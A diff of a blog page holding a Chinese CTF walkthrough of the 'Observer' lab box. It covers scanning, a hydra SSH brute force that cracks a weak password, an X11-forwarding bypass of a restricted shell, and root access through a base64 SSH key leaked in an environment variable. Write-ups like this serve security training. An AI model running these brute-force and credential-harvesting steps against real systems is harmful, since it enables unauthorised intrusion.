@@ -22,7 +22,7 @@
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nyx_Observer.html">
 <meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
 <title>nyx_Observer</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -46,7 +46,17 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
 </style>
 
 
@@ -80,53 +90,49 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>一、信息收集</h1>
 <h2>1. 主机发现</h2>
-<p>首先，使用<code>arp-scan</code>在本地网络中发现目标主机。</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<p>首先，使用<code class="notranslate">arp-scan</code>在本地网络中发现目标主机。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ sudo arp-scan -l
 ...
 192.168.205.131 08:00:27:e7:c9:11       PCS Systemtechnik GmbH
-...
-</code></pre>
-<p>确认目标主机IP地址为 <code>192.168.205.131</code>。</p>
+...</pre></div>
+<p>确认目标主机IP地址为 <code class="notranslate">192.168.205.131</code>。</p>
 <h2>2. 端口扫描</h2>
-<p>使用 <code>nmap</code> 对目标主机进行全端口扫描和服务版本探测。</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<p>使用 <code class="notranslate">nmap</code> 对目标主机进行全端口扫描和服务版本探测。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nmap -p- -A 192.168.205.131           
 Starting Nmap 7.95 ( https://nmap.org )
 ...
-Nmap scan report for 192.168.205.131
+Nmap scan report <span class="pl-k">for</span> 192.168.205.131
 Host is up (0.00015s latency).
 Not shown: 65533 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
-80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+80/tcp open  http    Apache httpd 2.4.62 <span class="pl-s"><span class="pl-pds">((</span>Debian<span class="pl-pds">))</span></span>
 MAC Address: 08:00:27:E7:C9:11 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
-...
-</code></pre>
+...</pre></div>
 <p>扫描结果显示开放了 <strong>22 (SSH)</strong> 和 <strong>80 (HTTP)</strong> 两个端口。</p>
 <h1>二、Web渗透</h1>
 <h2>1. 虚拟主机发现</h2>
-<p>直接访问 <code>http://192.168.205.131</code> 显示的是 Apache 的默认页面。通过目录爆破可以获得一些目录信息。</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<p>直接访问 <code class="notranslate">http://192.168.205.131</code> 显示的是 Apache 的默认页面。通过目录爆破可以获得一些目录信息。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ gobuster dir -u http://192.168.205.131 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64  
 ...
 /index.html           (Status: 200) [Size: 35742]
-/images               (Status: 301) [Size: 319] [--&gt; http://192.168.205.131/images/]
-/css                  (Status: 301) [Size: 316] [--&gt; http://192.168.205.131/css/]
-/js                   (Status: 301) [Size: 315] [--&gt; http://192.168.205.131/js/]
-/fonts                (Status: 301) [Size: 318] [--&gt; http://192.168.205.131/fonts/]
-...
-</code></pre>
-<p>通过查看<code>/image</code>中的图片文件，可以发现，他使用的图片内容貌似是web网站模板的图片，所以猜测可能存在域名。将域名 <code>Observer.nlx</code> 绑定到IP。</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+/images               (Status: 301) [Size: 319] [--<span class="pl-k">&gt;</span> http://192.168.205.131/images/]
+/css                  (Status: 301) [Size: 316] [--<span class="pl-k">&gt;</span> http://192.168.205.131/css/]
+/js                   (Status: 301) [Size: 315] [--<span class="pl-k">&gt;</span> http://192.168.205.131/js/]
+/fonts                (Status: 301) [Size: 318] [--<span class="pl-k">&gt;</span> http://192.168.205.131/fonts/]
+...</pre></div>
+<p>通过查看<code class="notranslate">/image</code>中的图片文件，可以发现，他使用的图片内容貌似是web网站模板的图片，所以猜测可能存在域名。将域名 <code class="notranslate">Observer.nlx</code> 绑定到IP。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ sudo vim /etc/hosts
 
-# 在文件末尾添加
-192.168.205.131 Observer.nlx
-</code></pre>
+<span class="pl-c"><span class="pl-c">#</span> 在文件末尾添加</span>
+192.168.205.131 Observer.nlx</pre></div>
 <h2>2. Web信息枚举</h2>
-<p>访问 <code>http://Observer.nlx</code>，网站是一个静态的网页模板。在对网站目录进行爆破后未发现敏感文件，但在主页<code>index.html</code>的源码中，“Our Team”部分发现了几个可疑的用户名。</p>
-<p><img src="http://7r1UMPHK.github.io/image/20250810130421538.webp" alt="image-20250810130421280" /></p>
+<p>访问 <code class="notranslate">http://Observer.nlx</code>，网站是一个静态的网页模板。在对网站目录进行爆破后未发现敏感文件，但在主页<code class="notranslate">index.html</code>的源码中，“Our Team”部分发现了几个可疑的用户名。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/089c066bd56a333003c6d5e20587db6a1573604cb827b0807f5f72be90bb7b44/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303831303133303432313533382e77656270"><img src="https://camo.githubusercontent.com/089c066bd56a333003c6d5e20587db6a1573604cb827b0807f5f72be90bb7b44/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303831303133303432313533382e77656270" alt="image-20250810130421280" data-canonical-src="http://7r1UMPHK.github.io/image/20250810130421538.webp" style="max-width: 100%;"></a></p>
 <p>从源码中，我们提取到以下潜在用户名：</p>
 <ul>
 <li><strong>john</strong></li>
@@ -137,7 +143,7 @@ MAC Address: 08:00:27:E7:C9:11 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 <h1>三、主机渗透与立足点</h1>
 <h2>1. SSH爆破</h2>
 <p>利用上一步发现的用户名列表，结合弱口令字典，对SSH服务进行爆破攻击。</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ cat user.txt
 john
 mike
@@ -148,75 +154,66 @@ niscal
 └─$ hydra -L user.txt -P /path/to/passwords.txt ssh://192.168.205.131 -t 64
 ...
 [22][ssh] host: 192.168.205.131   login: niscal   password: niscal
-...
-</code></pre>
-<p>成功爆破出用户 <code>niscal</code> 的密码为 <code>niscal</code>。</p>
+...</pre></div>
+<p>成功爆破出用户 <code class="notranslate">niscal</code> 的密码为 <code class="notranslate">niscal</code>。</p>
 <h2>2. 受限Shell绕过</h2>
 <p>尝试使用获取的凭证登录SSH。</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ ssh niscal@192.168.205.131
-niscal@192.168.205.131's password: 
+niscal@192.168.205.131<span class="pl-s"><span class="pl-pds">'</span>s password: </span>
+<span class="pl-s"></span>
+<span class="pl-s">########################################</span>
+<span class="pl-s"># Dear person,                         #</span>
+<span class="pl-s"># Not now! I<span class="pl-pds">'</span></span>m busy with the terminal. <span class="pl-c"><span class="pl-c">#</span></span>
+<span class="pl-c"><span class="pl-c">#</span> by Niscal                            #</span>
+<span class="pl-c"><span class="pl-c">#</span>#######################################</span>
 
-########################################
-# Dear person,                         #
-# Not now! I'm busy with the terminal. #
-# by Niscal                            #
-########################################
-
-Connection to 192.168.205.131 closed.
-</code></pre>
-<p>登录后连接立即被关闭，并显示一条关键信息 <strong>&quot;I'm busy with the terminal.&quot;</strong>。这强烈暗示当前登录的会话不被认为是“真正的终端”，因此被限制脚本拒绝。</p>
+Connection to 192.168.205.131 closed.</pre></div>
+<p>登录后连接立即被关闭，并显示一条关键信息 <strong>"I'm busy with the terminal."</strong>。这强烈暗示当前登录的会话不被认为是“真正的终端”，因此被限制脚本拒绝。</p>
 <h2>3. X11转发攻击</h2>
-<p>根据提示，我们尝试使用SSH的X11转发功能 (<code>-X</code> 或 <code>-Y</code>) 来请求一个图形化会话，这很可能绕过限制脚本。</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[~]
+<p>根据提示，我们尝试使用SSH的X11转发功能 (<code class="notranslate">-X</code> 或 <code class="notranslate">-Y</code>) 来请求一个图形化会话，这很可能绕过限制脚本。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
 └─$ ssh -X niscal@192.168.205.131 
-niscal@192.168.205.131's password: 
-...
-</code></pre>
-<p><img src="http://7r1UMPHK.github.io/image/20250810125233587.webp" alt="image-20250810125226283" /></p>
+niscal@192.168.205.131<span class="pl-s"><span class="pl-pds">'</span>s password: </span>
+<span class="pl-s">...</span></pre></div>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/bebcd65e20aad51e33e99276e4f98127be05d418916a32651748eb16d5720a4a/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303831303132353233333538372e77656270"><img src="https://camo.githubusercontent.com/bebcd65e20aad51e33e99276e4f98127be05d418916a32651748eb16d5720a4a/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303831303132353233333538372e77656270" alt="image-20250810125226283" data-canonical-src="http://7r1UMPHK.github.io/image/20250810125233587.webp" style="max-width: 100%;"></a></p>
 <p>成功显示，并且显示了下面内容。</p>
-<pre><code>niscal@observer:~$ echo -n REMOisGOD | passwd remo
+<pre class="notranslate"><code class="notranslate">niscal@observer:~$ echo -n REMOisGOD | passwd remo
 </code></pre>
 <p>经过尝试该X11 shell在输入命令回车就会断开。</p>
 <h1>四、权限提升</h1>
 <h2>1. 横向移动 (niscal -&gt; remo)</h2>
-<p>使用显示的用户名<code>remo</code>和密码<code>REMOisGOD</code>进行登录。</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<p>使用显示的用户名<code class="notranslate">remo</code>和密码<code class="notranslate">REMOisGOD</code>进行登录。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ ssh remo@192.168.205.131
-remo@192.168.205.131's password: 
-...
-remo@observer:~$ id
-uid=1001(remo) gid=1001(remo) groups=1001(remo)
-</code></pre>
-<p>成功切换到 <code>remo</code> 用户。</p>
+remo@192.168.205.131<span class="pl-s"><span class="pl-pds">'</span>s password: </span>
+<span class="pl-s">...</span>
+<span class="pl-s">remo@observer:~$ id</span>
+<span class="pl-s">uid=1001(remo) gid=1001(remo) groups=1001(remo)</span></pre></div>
+<p>成功切换到 <code class="notranslate">remo</code> 用户。</p>
 <h2>2. 提权至root</h2>
-<p>在 <code>remo</code> 用户下进行信息收集，检查环境变量时发现了一个重大线索。</p>
-<pre lang="bash"><code>remo@observer:~$ env
+<p>在 <code class="notranslate">remo</code> 用户下进行信息收集，检查环境变量时发现了一个重大线索。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">remo@observer:<span class="pl-k">~</span>$ env
 ...
 rootKEY=LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K... (此处省略了超长的Base64字符串)
-...
-</code></pre>
-<p>环境变量 <code>rootKEY</code> 包含一个Base64编码的字符串，看起来像是一个SSH私钥。我们将其解码并保存。</p>
-<pre lang="bash"><code>remo@observer:~$ echo 'LS0tLS1...LS0tCg==' | base64 -d &gt; id_rsa
-remo@observer:~$ chmod 600 id_rsa
-</code></pre>
-<p>使用这个私钥尝试以 <code>root</code> 用户身份登录本地SSH服务。</p>
-<pre lang="bash"><code>remo@observer:~$ ssh root@127.0.0.1 -i id_rsa
-Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
-root@observer:~# id
-uid=0(root) gid=0(root) groups=0(root)
-</code></pre>
-<p>成功提权至 <code>root</code> 用户！</p>
+...</pre></div>
+<p>环境变量 <code class="notranslate">rootKEY</code> 包含一个Base64编码的字符串，看起来像是一个SSH私钥。我们将其解码并保存。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">remo@observer:<span class="pl-k">~</span>$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>LS0tLS1...LS0tCg==<span class="pl-pds">'</span></span> <span class="pl-k">|</span> base64 -d <span class="pl-k">&gt;</span> id_rsa
+remo@observer:<span class="pl-k">~</span>$ chmod 600 id_rsa</pre></div>
+<p>使用这个私钥尝试以 <code class="notranslate">root</code> 用户身份登录本地SSH服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">remo@observer:<span class="pl-k">~</span>$ ssh root@127.0.0.1 -i id_rsa
+Warning: Permanently added <span class="pl-s"><span class="pl-pds">'</span>127.0.0.1<span class="pl-pds">'</span></span> (ED25519) to the list of known hosts.
+root@observer:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> id</span>
+uid=0(root) gid=0(root) groups=0(root)</pre></div>
+<p>成功提权至 <code class="notranslate">root</code> 用户！</p>
 <h1>五、获取Flag</h1>
 <p>现在我们拥有了所有权限，可以读取所有的Flag。</p>
-<pre lang="bash"><code>root@observer:~# cat /root/root.txt
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@observer:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /root/root.txt</span>
 fa40a17de09827a5ae20a894304c6a49
 
-root@observer:~# cat /home/remo/user.txt 
-f2edafebb9851d806ff15deb0477ebe8
-</code></pre>
-<p>所有Flag均已找到，渗透测试完成。</p>
-</div>
+root@observer:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /home/remo/user.txt </span>
+f2edafebb9851d806ff15deb0477ebe8</pre></div>
+<p>所有Flag均已找到，渗透测试完成。</p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -241,7 +238,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -288,7 +285,70 @@ function iFrameLoading(){
     }
 }
 
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
 
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
